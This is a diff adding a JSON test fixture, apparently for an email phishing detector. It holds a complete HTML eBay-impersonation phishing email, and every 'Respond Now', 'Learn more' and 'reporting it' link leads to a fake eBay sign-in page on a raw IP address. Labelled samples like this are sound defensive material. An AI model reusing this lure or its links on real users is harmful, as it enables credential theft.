@@ -1,0 +1,98 @@
+{
+  "tenant_id": "2a9c5f75-c7ee-4b9f-9ccc-626ddcbd786a",
+  "mailbox_id": "atharv@hackntrain.com",
+  "message_id": "test-malicious-2f3c838ccb56c86f138fe88e90f5648c",
+  "force_override": true,
+  "test_mode": true,
+  "email_data": {
+    "id": "test-malicious-2f3c838ccb56c86f138fe88e90f5648c",
+    "emailcontent": {
+      "subject": "Question from eBay member",
+      "sender": {
+        "emailAddress": {
+          "name": "",
+          "address": "khristina.griffin@enron.com"
+        }
+      },
+      "from": {
+        "emailAddress": {
+          "name": "",
+          "address": "khristina.griffin@enron.com"
+        }
+      },
+      "toRecipients": [
+        {
+          "emailAddress": {
+            "name": "",
+            "address": "christinehauk@txu.com"
+          }
+        }
+      ],
+      "ccRecipients": [],
+      "bccRecipients": [],
+      "replyTo": [],
+      "receivedDateTime": "2006-07-06T01:41:07+03:00",
+      "sentDateTime": "2006-07-06T01:41:07+03:00",
+      "body": {
+        "contentType": "html",
+        "content": "<style type=\"text/css\">\n<!--\n.style1 {\n\tfont-family: Verdana, Arial, Helvetica, sans-serif;\n\tfont-size: x-small;\n}\n.style2 {font-size: x-small}\n-->\n</style>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\">\n<TBODY>\n<TR>\n<TD style=\"WORD-WRAP: break-word\" width=\"100%\">\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" border=0 xmlns:x=\"urn:schemas-microsoft-com:xslt\">\n<TBODY>\n<TR>\n<TD>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD width=1 rowSpan=2></TD>\n<TD></TD>\n<TD width=1 rowSpan=2></TD></TR>\n</TBODY></TABLE>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" bgColor=white border=0>\n<TBODY>\n<TR>\n<TD></TD>\n<TD width=1 rowSpan=3></TD></TR>\n<TR>\n<TD>\n<TABLE cellSpacing=0 cellPadding=2 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD><FONT face=\"Verdana, sans-serif\" color=#666666 size=1><B>eBay sent this message to you from Stanley Muller (welshdruid)&nbsp;.</B><BR>\n  Your registered name is included to show this message originated from eBay. <A href=\"http://80.50.250.237/xampp/img/new1.png/signin.ebay.com/ws/eBayISAPI.dl/SignIn/index.html?MfcISAPICommand=SignInPowerSeller&siteid=0&co_partnerId=2&UsingSSL=1&ru=&pp=&pa1=&pa2=&pa3=&i1=-1&pageType=-1&userid=\" target=_blank><FONT color=#003399>Learn more</FONT></A>.</FONT></TD>\n</TR></TBODY></TABLE></TD></TR></TBODY></TABLE>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" bgColor=white border=0>\n<TBODY>\n<TR>\n<TD noWrap width=\"1%\"><IMG height=39 src=\"http://pics.ebaystatic.com/aw/pics/email/syiSessions/hdrLeft_13x39.gif\" width=13></TD>\n<TD noWrap width=\"98%\" background=http://pics.ebaystatic.com/aw/pics/email/syiSessions/imgSpan_5x39.gif><SPAN class=SectionTitle><FONT size=4><B>Question about Item -- Respond Now</B></FONT></SPAN></TD>\n<TD vAlign=bottom noWrap width=\"1%\"><a href=\"http://80.50.250.237/xampp/img/new1.png/signin.ebay.com/ws/eBayISAPI.dl/SignIn/index.html?MfcISAPICommand=SignInPowerSeller&siteid=0&co_partnerId=2&UsingSSL=1&ru=&pp=&pa1=&pa2=&pa3=&i1=-1&pageType=-1&userid=\"><IMG src=\"http://pics.ebaystatic.com/aw/pics/email/syiSessions/hdrRight_90x39.gif\" alt=eBay width=90 height=39 border=\"0\"></a></TD>\n</TR></TBODY></TABLE>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD><IMG height=1 src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=10></TD>\n<TD>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD>\n<TABLE style=\"BORDER-RIGHT: #9999cc 1px solid; BORDER-LEFT: #9999cc 1px solid; BORDER-BOTTOM: #9999cc 1px solid\" width=\"100%\" bgColor=#eeeef8 border=0>\n<TBODY>\n<TR>\n<TD style=\"PADDING-LEFT: 8px\" height=30><FONT face=\"Arial, Verdana\" size=2>eBay sent this message on behalf of an eBay member via My Messages. Responses sent using email will not reach the eBay member.Use the <B>Respond Now</B> button below to respond to this message</FONT></TD></TR></TBODY></TABLE></TD>\n<TD><IMG height=1 src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=10></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>\n<TR>\n<TD><IMG height=10 src=\"http://pics.ebaystatic.com/aw/pics/s.gif\"></TD></TR>\n<TR>\n<TD>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD><IMG height=1 src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=10></TD>\n<TD vAlign=top>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD vAlign=top>\n<TABLE height=421 cellSpacing=0 cellPadding=0 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD height=387 valign=\"top\"><TABLE cellSpacing=0 cellPadding=1 width=\"100%\" align=left bgColor=#9999cc border=0>\n<TBODY>\n<TR bgColor=#9999cc height=26>\n<TD><FONT face=\"Arial, Helvetica, Verdana, sans-serif\" color=#ffffff>&nbsp;<SPAN class=SectionTitle style2>Question from welshdruid</SPAN></FONT></TD>\n</TR>\n<TR>\n<TD>\n<TABLE height=124 cellSpacing=0 cellPadding=0 width=\"100%\" bgColor=#eeeef8 border=0>\n<TBODY>\n<TR>\n<TD colSpan=3 height=6><IMG title=\"\" height=4 alt=\"\" src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=1></TD></TR>\n<TR>\n<TD height=18><IMG title=\"\" height=1 alt=\"\" src=\"\" width=1></TD>\n<TD noWrap colSpan=2 height=18><FONT face=\"Arial, Verdana\" size=2><B>About This Member</B></FONT></TD></TR>\n<TR>\n<TD height=27><IMG title=\"\" height=1 alt=\"\" src=\"\" width=1></TD>\n<TD noWrap colSpan=2 height=27><FONT face=\"Arial, Verdana\" size=2><A title=http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback&amp;userid=welshdruid href=\"http://80.50.250.237/xampp/img/new1.png/signin.ebay.com/ws/eBayISAPI.dl/SignIn/index.html?MfcISAPICommand=SignInPowerSeller&siteid=0&co_partnerId=2&UsingSSL=1&ru=&pp=&pa1=&pa2=&pa3=&i1=-1&pageType=-1&userid=\" target=_blank><FONT color=#003399>welshdruid</FONT>( <FONT color=#003399>872<IMG title=\"\" height=25 alt=\"\" src=\"http://pics.ebaystatic.com/aw/pics/icon/iconYellowStar_25x25.gif\" width=25 align=absMiddle border=0></FONT>)</A></FONT></TD>\n</TR>\n<TR>\n<TD height=18><IMG title=\"\" height=1 alt=\"\" src=\"\" width=1></TD>\n<TD noWrap width=\"20%\" height=18><FONT face=\"Arial, Verdana\" size=2>Positive Feedback:</FONT></TD>\n<TD height=18><FONT face=\"Arial, Verdana\" size=2>100%</FONT></TD></TR>\n<TR>\n<TD height=18><IMG title=\"\" height=1 alt=\"\" src=\"\" width=1></TD>\n<TD noWrap width=\"20%\" height=18><FONT face=\"Arial, Verdana\" size=2>Member Since:</FONT></TD>\n<TD height=18><FONT face=\"Arial, Verdana\" size=2>Apr-30-03</FONT></TD></TR>\n<TR>\n<TD height=18><IMG title=\"\" height=1 alt=\"\" src=\"\" width=1></TD>\n<TD noWrap width=\"20%\" height=18><FONT face=\"Arial, Verdana\" size=2>Location:</FONT></TD>\n<TD height=18><FONT face=\"Arial, Verdana\" size=2>CA, United States</FONT></TD></TR>\n<TR>\n<TD height=13><IMG title=\"\" height=1 alt=\"\" src=\"\" width=1></TD>\n<TD noWrap width=\"20%\" height=13><FONT face=\"Arial, Verdana\" size=2>Registered On:</FONT></TD>\n<TD height=13><FONT face=\"Arial, Verdana\" size=2>www.ebay.com</FONT></TD></TR>\n<TR>\n<TD colSpan=3 height=6><IMG title=\"\" height=4 alt=\"\" src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=1></TD></TR></TBODY></TABLE></TD></TR>\n<TR>\n<TD>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" align=center border=0>\n<TBODY>\n<TR>\n  <TD><TABLE cellSpacing=0 cellPadding=4>\n    <TBODY>\n      <TR>\n        <TD width=\"75%\" height=\"142\" vAlign=top bgcolor=\"#FFFFFF\"><FONT face=\"Arial, Verdana\" size=2><BR>\n          </FONT><span class=\"style1\">Hi, </span>\n          <P><span class=\"style1\">Is the item still available for sale? Let me know because I'm online and I can pay you right now.<br>\n                <BR>\n            Thank you,<br>\n            <FONT color=#666666><B>welshdruid</B></FONT></span></P></TD>\n        <TD width=\"22%\" align=middle vAlign=top bgcolor=\"#FFFFFF\"><TABLE borderColor=#999999 cellSpacing=0 cellPadding=0 width=\"100%\" bgColor=#eeeef8 border=1>\n            <TBODY>\n              <TR>\n                <TD><TABLE cellSpacing=3 cellPadding=3 width=\"100%\">\n                    <TBODY>\n                      <TR>\n                        <TD align=middle><FONT face=\"Arial, Verdana\" size=2><B>Respond to this question in My Messages.</B></FONT></TD>\n                      </TR>\n                      <TR>\n                        <TD align=middle><A href=\"http://80.50.250.237/xampp/img/new1.png/signin.ebay.com/ws/eBayISAPI.dl/SignIn/index.html?MfcISAPICommand=SignInPowerSeller&siteid=0&co_partnerId=2&UsingSSL=1&ru=&pp=&pa1=&pa2=&pa3=&i1=-1&pageType=-1&userid=\" target=_blank><IMG height=22 alt=\"Respond Now\" src=\"http://pics.ebaystatic.com/aw/pics/email/message/btnRespondNow.gif\" width=105 border=0 NOSEND=\"1\"></A></TD>\n                      </TR>\n                    </TBODY>\n                </TABLE></TD>\n              </TR>\n            </TBODY>\n        </TABLE></TD>\n        <TD width=\"3%\" bgcolor=\"#FFFFFF\"></TD>\n      </TR>\n    </TBODY>\n  </TABLE></TD>\n</TR>\n<TR bgColor=#ffffff>\n<TD></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>\n<TR>\n<TD height=34>\n<TABLE cellSpacing=0 cellPadding=0 border=0>\n<TBODY>\n<TR>\n<TD><IMG height=8 src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=1 border=0></TD></TR>\n<TR>\n<TD><FONT face=\"Arial, Verdana\" size=2>Thank you for using eBay!</FONT></TD></TR>\n<TR>\n<TD><IMG height=10 src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=1 border=0></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD>\n<TD vAlign=top width=10><IMG src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=10></TD>\n<TD vAlign=top align=right width=188>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD>\n<TABLE style=\"BORDER-RIGHT: #6b7b91 1px solid; BORDER-TOP: #6b7b91 1px solid; BORDER-LEFT: #6b7b91 1px solid; BORDER-BOTTOM: #6b7b91 1px solid\" cellSpacing=0 cellPadding=0 border=0>\n<TBODY>\n<TR>\n<TD>\n<TABLE cellSpacing=0 cellPadding=0 border=0>\n<TBODY>\n<TR>\n<TD>\n<TABLE cellSpacing=0 cellPadding=0 border=0>\n<TBODY>\n<TR>\n<TD bgColor=#cad2dd><IMG height=25 alt=\"Marketplace Safety Tip\" src=\"http://pics.ebaystatic.com/aw/pics/securityCenter/imgShield_25x25.gif\" width=25 border=0></TD>\n<TD noWrap bgColor=#cad2dd><FONT face=\"Arial, Helvetica, Verdana, sans-serif\" size=-1><B><A style=\"COLOR: #000000; TEXT-DECORATION: none\" href=\"http://pages.ebay.com/securitycenter\" target=_blank>Marketplace Safety Tip</A></B></FONT></TD>\n<TD bgColor=#cad2dd><IMG title=\"\" height=25 alt=\" \" src=\"http://pics.ebaystatic.com/aw/pics/securityCenter/imgTabCorner_25x25.gif\" width=25 border=0></TD></TR></TBODY></TABLE></TD></TR>\n<TR>\n<TD>\n<TABLE cellSpacing=0 cellPadding=5 border=0>\n<TBODY>\n<TR>\n<TD><FONT face=\"Arial, Verdana\" size=2><B>Always remember to complete your transactions on eBay - it`s the safer way to trade.</B><BR><BR>Is this message an offer to buy your item directly through email without winning the item on eBay? If so, please help make the eBay marketplace safer by reporting it to us. These \"outside of eBay\" transactions may be unsafe and are against eBay policy.<a href=\"http://80.50.250.237/xampp/img/new1.png/signin.ebay.com/ws/eBayISAPI.dl/SignIn/index.html?MfcISAPICommand=SignInPowerSeller&siteid=0&co_partnerId=2&UsingSSL=1&ru=&pp=&pa1=&pa2=&pa3=&i1=-1&pageType=-1&userid=\"> <FONT color=#003399>Learn more about trading safely</FONT></a>.</FONT></TD>\n</TR></TBODY></TABLE></TD></TR>\n<TR>\n<TD bgColor=#c9d2dc height=5><IMG height=10 src=\"http://pics.ebay.com/aw/pics/spacer.gif\" width=10></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>\n<TR>\n<TD><IMG height=10 src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=1></TD></TR>\n<TR>\n<TD>\n<TABLE style=\"BORDER-RIGHT: #c6c6c6 1px solid; BORDER-TOP: #c6c6c6 1px solid; BORDER-LEFT: #c6c6c6 1px solid; BORDER-BOTTOM: #c6c6c6 1px solid\" cellSpacing=0 cellPadding=5 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD><FONT face=\"Arial, Verdana\" size=2>Is this email inappropriate? Does it violate <A href=\"http://80.50.250.237/xampp/img/new1.png/signin.ebay.com/ws/eBayISAPI.dl/SignIn/index.html?MfcISAPICommand=SignInPowerSeller&siteid=0&co_partnerId=2&UsingSSL=1&ru=&pp=&pa1=&pa2=&pa3=&i1=-1&pageType=-1&userid=\" target=_blank><FONT color=#003399>eBay policy</FONT></A>? Help protect the community by <A href=\"http://80.50.250.237/xampp/img/new1.png/signin.ebay.com/ws/eBayISAPI.dl/SignIn/index.html?MfcISAPICommand=SignInPowerSeller&siteid=0&co_partnerId=2&UsingSSL=1&ru=&pp=&pa1=&pa2=&pa3=&i1=-1&pageType=-1&userid=\" target=_blank><FONT color=#003399>reporting it</FONT></A>.</FONT></TD>\n</TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR>\n<TR>\n<TD colSpan=3><IMG height=10 src=\"http://pics.ebaystatic.com/aw/pics/s.gif\" width=1></TD></TR></TBODY></TABLE>\n<TABLE cellSpacing=0 cellPadding=0 width=\"100%\" bgColor=#cccccc>\n<TBODY>\n<TR></TR></TBODY></TABLE>\n<TABLE height=116 cellSpacing=0 cellPadding=0 width=\"100%\" border=0>\n<TBODY>\n<TR>\n<TD height=16><FONT face=\"Arial, Verdana\" color=#666666 size=1>See our Privacy Policy and User Agreement if you have questions about eBay's communication policies.</FONT></TD></TR>\n<TR>\n<TD height=58><FONT face=\"Arial, Verdana\" color=#666666 size=1>Copyright &nbsp;1995-2006 eBay, Inc. All Rights Reserved.<BR>Designated trademarks and brands are the property of their respective owners.<BR>eBay and the eBay logo are registered trademarks or trademarks of eBay, Inc.<BR>eBay is located at 2145 Hamilton Avenue, San Jose, CA 95125.</FONT></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>\n"
+      },
+      "hasAttachments": false,
+      "internetMessageId": "<dcb52107-b2b4-44d7-a91f-befc3a4255fc@generated>",
+      "importance": "normal",
+      "isRead": false,
+      "isDraft": false,
+      "flag": {
+        "flagStatus": "notFlagged"
+      }
+    },
+    "headers": {
+      "spf": "pass",
+      "dkim": "none",
+      "dmarc": "fail",
+      "returnpath": "khristina.griffin@enron.com",
+      "ipaddress": [
+        "2603:1096:c01:ec::"
+      ],
+      "smtpserver": "PN2P287MB0160.INDP287.PROD.OUTLOOK.COM",
+      "tlsversion": "not available",
+      "list_unsubscribe_urls": [],
+      "list_unsubscribe_mailtos": [],
+      "list_unsubscribe_one_click": false
+    },
+    "payload": {
+      "content": "eBay sent this message to you from Stanley Muller (welshdruid) . Your registered name is included to show this message originated from eBay. Learn more . Question about Item -- Respond Now eBay sent this message on behalf of an eBay member via My Messages. Responses sent using email will not reach the eBay member.Use the Respond Now button below to respond to this message Question from welshdruid About This Member welshdruid ( 872 ) Positive Feedback: 100% Member Since: Apr-30-03 Location: CA, U",
+      "links": [
+        "http://80.50.250.237/xampp/img/new1.png/signin.ebay.com/ws/eBayISAPI.dl/SignIn/index.html?MfcISAPICommand=SignInPowerSeller&siteid=0&co_partnerId=2&UsingSSL=1&ru=&pp=&pa1=&pa2=&pa3=&i1=-1&pageType=-1&userid=",
+        "http://pages.ebay.com/securitycenter",
+        "http://pics.ebaystatic.com/aw/pics/email/syiSessions/hdrLeft_13x39.gif",
+        "http://pics.ebaystatic.com/aw/pics/email/syiSessions/imgSpan_5x39.gif",
+        "http://pics.ebaystatic.com/aw/pics/email/syiSessions/hdrRight_90x39.gif",
+        "http://pics.ebaystatic.com/aw/pics/s.gif",
+        "http://feedback.ebay.com/ws/eBayISAPI.dll?ViewFeedback&userid=welshdruid",
+        "http://pics.ebaystatic.com/aw/pics/icon/iconYellowStar_25x25.gif",
+        "http://pics.ebaystatic.com/aw/pics/email/message/btnRespondNow.gif",
+        "http://pics.ebaystatic.com/aw/pics/securityCenter/imgShield_25x25.gif",
+        "http://pics.ebaystatic.com/aw/pics/securityCenter/imgTabCorner_25x25.gif",
+        "http://pics.ebay.com/aw/pics/spacer.gif",
+        "http://www.ebay.com",
+        "http://signin.ebay.com",
+        "http://pics.ebaystatic.com",
+        "http://member.Us",
+        "http://feedback.ebay.com",
+        "http://pages.ebay.com",
+        "http://pics.ebay.com"
+      ],
+      "domains": [
+        "ebay.com",
+        "signin.ebay.com",
+        "pics.ebay.com",
+        "pages.ebay.com",
+        "80.50.250.237",
+        "feedback.ebay.com",
+        "member.Us",
+        "pics.ebaystatic.com"
+      ]
+    }
+  }
+}
